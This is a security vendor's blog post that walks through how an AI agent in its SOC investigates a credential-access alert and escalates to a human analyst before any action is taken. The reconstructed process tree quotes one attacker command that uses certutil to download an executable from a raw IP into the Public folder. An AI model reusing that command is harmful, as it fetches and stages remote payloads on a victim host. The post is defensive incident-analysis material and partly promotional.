---
title: "The Agentic SOC: How an AI Agent Investigates an Alert End to End"
description: "A step-by-step walkthrough of an autonomous investigation — the tools the agent calls, the evidence it assembles, where it stops, and what the analyst receives."
date: "2026-08-07"
category: "AI & Security"
tags: ["Agentic AI", "SOC", "Detection", "Automation"]
---

Descriptions of agentic security tend to stay abstract. This one does not. Below is the actual shape of an autonomous investigation as it runs in our SOC — one alert, from arrival to analyst handoff.

The alert: **suspicious credential access on WKS-2213**, raised by EDR at 04:12:41.

## Step 0: What the agent starts with

Almost nothing useful. A raw alert contains a rule name, a host, a timestamp, a process, and a severity the vendor assigned without knowing anything about your business.

```
rule:      Credential Access - LSASS Handle Request
host:      WKS-2213
process:   C:\Users\Public\svc-update.exe
user:      CORP\a.menon
severity:  High
time:      2026-08-07T04:12:41Z
```

A human analyst would look at this and immediately have questions. So does the agent.

## Step 1: Establish context (parallel)

The agent's first move is not investigation — it is orientation. Four lookups issued simultaneously:

- **Asset lookup.** WKS-2213 → owner, criticality tier, OS build, department, location.
- **Identity lookup.** `a.menon` → role, group memberships, privilege level, normal working hours, normal locations.
- **Alert history.** Anything else on this host or user in the last 30 days.
- **Rule context.** How often does this rule fire estate-wide, and what proportion historically resolved as true positive?

That last query matters more than it looks. A rule with a 2% historical true-positive rate deserves different initial scepticism from one at 60%.

**Findings:** WKS-2213 is a Tier 2 finance workstation. `a.menon` is a standard user, no admin rights, normal hours 09:00–18:00 IST. The rule fires roughly forty times a month estate-wide, 5% true positive. No prior alerts on this host.

Already something is wrong: the alert fired at 04:12 IST, well outside this user's working pattern.

## Step 2: Reconstruct what happened

Now the agent pulls process ancestry — the single most valuable artefact in endpoint investigation.

```
services.exe
└── svchost.exe
    └── explorer.exe
        └── OUTLOOK.EXE
            └── cmd.exe  /c certutil -urlcache -f http://45.13.x.211/u.exe %PUBLIC%\svc-update.exe
                └── svc-update.exe   ← alerting process
```

This chain answers the question on its own. A binary was downloaded via `certutil` — a living-off-the-land technique — from a raw IP address, by a command spawned from Outlook, and then executed. That is not a false positive.

The agent tags the observed techniques: T1566 (phishing), T1105 (ingress tool transfer), T1003.001 (LSASS memory access).

## Step 3: Determine scope

A single compromised workstation is a contained problem. The agent's next job is to find out whether it is.

- **Same binary elsewhere?** Hash search across the estate.
- **Same network destination elsewhere?** Who else contacted 45.13.x.211?
- **Same delivery?** Search the mail gateway for messages with similar attachments or the same sender, and who else received them.
- **Lateral movement?** Authentication events originating from WKS-2213 in the last six hours.
- **Credential exposure?** Which accounts had sessions on this host when LSASS was accessed.

**Findings:** the hash appears on one other host, WKS-2108. The mail search returns eleven recipients of the same message; two clicked. Three accounts had active sessions on WKS-2213 — including `svc-backup`, a service account with broad file-share access.

That last finding changes the severity materially. The incident is no longer one workstation.

## Step 4: Assemble evidence and stop

Here is the part that matters most, and the part demos usually skip: **the agent stops.**

It does not isolate the hosts. It does not disable `svc-backup`. It does not email the client. It assembles what it has and escalates:

```
SEVERITY:  Critical (raised from High)
CONFIDENCE: 0.94

SUMMARY
Confirmed intrusion. Phishing → certutil download → credential
access. 2 hosts affected. Service account svc-backup potentially
compromised (active session during LSASS access).

EVIDENCE
- Process ancestry, WKS-2213        [query: edr.proc.4471]
- Identical hash on WKS-2108        [query: edr.hash.8823]
- 11 recipients, 2 clicks           [query: mail.camp.0912]
- 3 sessions incl. svc-backup       [query: id.sess.5510]

RECOMMENDED (requires approval)
1. Isolate WKS-2213, WKS-2108
2. Rotate svc-backup credentials — HIGH IMPACT, backup jobs
3. Purge campaign from 9 remaining mailboxes
4. Block 45.13.x.211 at perimeter

UNCERTAIN
- Whether credentials were exfiltrated (no egress after LSASS)
- Whether svc-backup was actually used post-access
```

Elapsed: 51 seconds.

## What the analyst does with it

The analyst does not repeat the investigation. They **audit** it:

- Spot-check two or three evidence queries against source data
- Assess the recommendations against operational reality — recommendation 2 will break overnight backups, so it needs the business owner
- Resolve the uncertainties, which is exactly where human judgement is required
- Decide and execute containment
- Call the client

That division is the whole point. Fifty-one seconds of mechanical work replaced twenty minutes of it, and the analyst's twenty minutes went into the decisions that actually needed a person.

## What this does to the numbers

Across our estate, the shape of the change is consistent:

- **Time to first meaningful context:** minutes → seconds
- **Investigation completeness:** every alert gets all six context queries, rather than the two an analyst runs when forty alerts are waiting
- **Consistency:** the 04:00 investigation is identical in depth to the 14:00 one
- **Analyst time:** shifts from gathering to deciding

The consistency point is underrated. The strongest argument for agentic investigation is not speed — it is that the quality of an investigation stops depending on how busy or tired the analyst was.

## What still breaks

Honesty requires the other column:

- **Novel techniques** with no historical analogue produce weaker hypotheses. The evidence gathering still works; the interpretation needs a human.
- **Sparse telemetry.** An agent cannot query a log source you do not collect. Coverage gaps are still coverage gaps.
- **Ambiguous business context.** "Is this bulk export legitimate?" often depends on a conversation that happened in a meeting.
- **Adversarial input.** Attacker-controlled data enters the agent's context. That is a real attack surface, covered in [securing agentic AI](/blog/securing-agentic-ai-attack-surface/).

## If you are evaluating this

Ask a prospective provider to walk you through a real investigation trail like the one above — redacted, but real. Look specifically for:

- Structured evidence with query references, not narrative prose
- An explicit uncertainty section
- A clear stopping point before action
- Recommendations that acknowledge operational impact

A provider who cannot produce that document is not running agentic investigation. They are running a chatbot over their alert queue.

Our [managed SOC](/services/managed-soc) works exactly as described here, and we will show you real trails during evaluation. See also [how the platform is architected](/platform/), and [talk to us](/contact) about a proof of value against your own telemetry.
